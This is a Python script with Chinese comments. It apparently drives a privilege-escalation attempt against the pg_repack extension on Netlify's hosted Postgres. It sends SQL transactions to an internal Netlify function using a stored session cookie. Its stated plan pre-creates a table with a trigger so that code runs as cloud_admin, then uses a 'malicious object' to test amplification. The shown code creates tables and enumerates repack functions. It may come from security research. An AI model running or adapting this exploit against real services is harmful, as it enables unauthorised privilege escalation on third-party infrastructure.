# -*- coding: utf-8 -*-
"""波19b:repack_trigger prosecdef 闭环验证
L1 预建 repack.log_<oid> 表 + 触发器 + 验证 cloud_admin INSERT 生效
L2 log 表做恶意对象(带触发器/规则)观察是否放大
L3 收尾清理
"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_NET

SITE_ID = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()
P = '/.netlify/functions/database-query'


def tx(qs, timeout=90):
    t0 = time.time()
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_NET,
         'Content-Type': 'application/json'}
    body = {'siteId': SITE_ID, 'action': 'transaction', 'queries': [{'sql': x} for x in qs]}
    conn.request('POST', P, body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw[:3000].decode('utf-8', 'ignore'), round(time.time() - t0, 1)


# L1: 找 oid + 预建 repack.log_<oid>
s, b, dt = tx(["drop table if exists l_src", "drop table if exists repack.log_1",
               "create table l_src(id int)",
               "select 'l_src'::regclass::oid as oid",
               "select repack.get_table_oid('l_src')"])
print('L1_setup         [%d] %.1fs %s' % (s, dt, b[:600]))

# repack schema 里有没有辅助函数
s, b, dt = tx(["select proname, pg_get_function_identity_arguments(oid) as args from pg_proc p "
               "join pg_namespace n on p.pronamespace=n.oid where n.nspname='repack' order by proname"])
print('L1b_repack_funcs [%d] %.1fs %s' % (s, dt, b[:2500]))
